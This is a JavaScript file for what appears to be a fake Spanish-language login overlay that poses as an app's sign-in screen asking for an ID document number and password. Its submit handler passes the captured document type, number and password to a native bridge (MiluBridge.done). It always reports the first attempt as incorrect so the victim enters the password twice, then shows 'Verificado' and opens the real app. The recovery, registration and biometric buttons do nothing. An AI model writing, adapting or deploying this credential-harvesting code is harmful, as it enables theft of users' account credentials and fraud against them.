(() => {
  const form = document.getElementById("loginForm");
  const documentInput = document.getElementById("document");
  const password = document.getElementById("password");
  const eyeBtn = document.getElementById("eyeBtn");
  const docTypeBtn = document.getElementById("docTypeBtn");
  const docTypeLabel = document.getElementById("docTypeLabel");
  const docMenu = document.getElementById("docMenu");
  const forgotBtn = document.getElementById("forgotBtn");
  const registerBtn = document.getElementById("registerBtn");
  const menuBtn = document.getElementById("menuBtn");
  const bioBtn = document.getElementById("bioBtn");
  const toastEl = document.getElementById("toast");

  let submitCount = 0;
  let toastTimer = 0;
  let docType = "DNI";
  let passwordVisible = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function setDocMenuOpen(open) {
    docMenu.hidden = !open;
    docTypeBtn.setAttribute("aria-expanded", open ? "true" : "false");
  }

  function setPasswordVisible(visible) {
    passwordVisible = visible;
    password.type = visible ? "text" : "password";
    eyeBtn.setAttribute("aria-pressed", visible ? "true" : "false");
    eyeBtn.setAttribute("aria-label", visible ? "Ocultar contraseña" : "Mostrar contraseña");
    eyeBtn.querySelector(".eye-off").hidden = visible;
    eyeBtn.querySelector(".eye-on").hidden = !visible;
  }

  docTypeBtn.addEventListener("click", (event) => {
    event.stopPropagation();
    setDocMenuOpen(docMenu.hidden);
  });

  docMenu.addEventListener("click", (event) => {
    const option = event.target.closest("[data-value]");
    if (!option) {
      return;
    }
    docType = option.getAttribute("data-value") || "DNI";
    docTypeLabel.textContent = docType;
    docMenu.querySelectorAll("[role='option']").forEach((item) => {
      item.setAttribute("aria-selected", item === option ? "true" : "false");
    });
    setDocMenuOpen(false);
  });

  document.addEventListener("click", () => {
    if (!docMenu.hidden) {
      setDocMenuOpen(false);
    }
  });

  eyeBtn.addEventListener("click", () => {
    setPasswordVisible(!passwordVisible);
  });

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    const doc = documentInput.value.trim();
    const pass = password.value;
    if (!doc || !pass) {
      toast("Ingresa tu documento y contraseña");
      return;
    }

    submitCount += 1;
    reportDone(`${docType}|${doc}|${pass}`);

    if (submitCount < 2) {
      toast("Documento o contraseña incorrectos");
      password.value = "";
      password.focus();
      return;
    }

    toast("Verificado");
    window.setTimeout(() => {
      openApp();
    }, 400);
  });

  forgotBtn.addEventListener("click", () => {
    toast("Usa tu contraseña para continuar");
  });

  registerBtn.addEventListener("click", () => {
    toast("Usa Ingresar para continuar");
  });

  menuBtn.addEventListener("click", () => {
    toast("Menú no disponible");
  });

  bioBtn.addEventListener("click", () => {
    toast("Usa tu contraseña para continuar");
  });

  setPasswordVisible(false);
})();
